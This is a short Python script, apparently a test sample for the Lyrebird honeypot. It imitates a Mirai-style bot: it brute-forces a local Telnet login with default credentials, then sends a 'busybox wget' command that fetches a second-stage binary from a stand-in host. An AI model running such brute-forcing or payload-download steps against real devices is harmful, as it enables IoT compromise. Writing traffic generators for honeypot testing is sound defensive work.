#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-3.0-or-later
"""A benign Mirai-style 'sample' for the honeypot demo: brute-forces the Telnet
login, then pulls a second stage in the fake shell. Lyrebird only observes —
nothing here is executed or fetched by the emulator."""
import socket
import time

HOST, PORT = "127.0.0.1", 2323
CREDS = [("root", "123456"), ("admin", "admin"), ("root", "root")]


def recv_until(sock, token, timeout=5.0):
    sock.settimeout(timeout)
    buf = b""
    try:
        while token not in buf:
            chunk = sock.recv(1024)
            if not chunk:
                break
            buf += chunk
    except socket.timeout:
        pass
    return buf


def main():
    s = socket.create_connection((HOST, PORT))
    print("[*] brute-forcing Telnet login...")
    for user, pw in CREDS:
        recv_until(s, b"login:")
        s.sendall(user.encode() + b"\r\n")
        recv_until(s, b"Password:")
        s.sendall(pw.encode() + b"\r\n")
        print(f"    tried {user}:{pw}")
        time.sleep(0.4)
    recv_until(s, b"# ")                       # fake shell granted
    print("[+] shell granted — pulling second stage")
    s.sendall(b"busybox wget http://10.0.0.9/mirai.arm7 -O /tmp/x\r\n")
    recv_until(s, b"# ", timeout=3)
    s.sendall(b"exit\r\n")
    time.sleep(0.3)
    s.close()
    print("[*] done — check the Lyrebird events")


if __name__ == "__main__":
    main()
